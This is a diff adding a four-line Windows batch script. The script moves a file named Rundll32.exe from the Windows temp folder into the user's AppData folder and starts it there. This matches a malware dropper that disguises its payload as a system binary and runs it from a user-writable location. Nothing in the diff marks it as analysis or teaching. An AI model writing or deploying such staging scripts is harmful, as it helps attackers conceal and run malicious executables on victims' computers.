@@ -1,0 +1,4 @@
+echo off
+move C:\\windows\\temp\\Rundll32.exe %appdata%\\Rundll32.exe
+start %appdata%\\Rundll32.exe
+exit
